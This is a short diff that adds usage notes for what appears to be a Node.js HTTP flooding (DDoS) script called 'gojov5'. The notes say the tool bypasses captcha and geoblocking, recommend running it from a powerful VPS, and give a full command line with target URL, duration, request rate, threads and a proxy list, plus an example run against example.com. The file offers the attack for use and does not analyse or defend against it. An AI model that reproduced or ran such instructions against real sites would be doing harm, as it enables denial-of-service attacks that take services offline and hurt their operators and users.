@@ -1,0 +1,7 @@
+free method
+can bypass captcha,geoblock but not all 
+just test use on a good vps for more power
+
+node gojov5 <target> <duration> <request per second> <threads> <proxyfile>
+
+node gojov5 https://example.com 120 60 10 proxy.txt
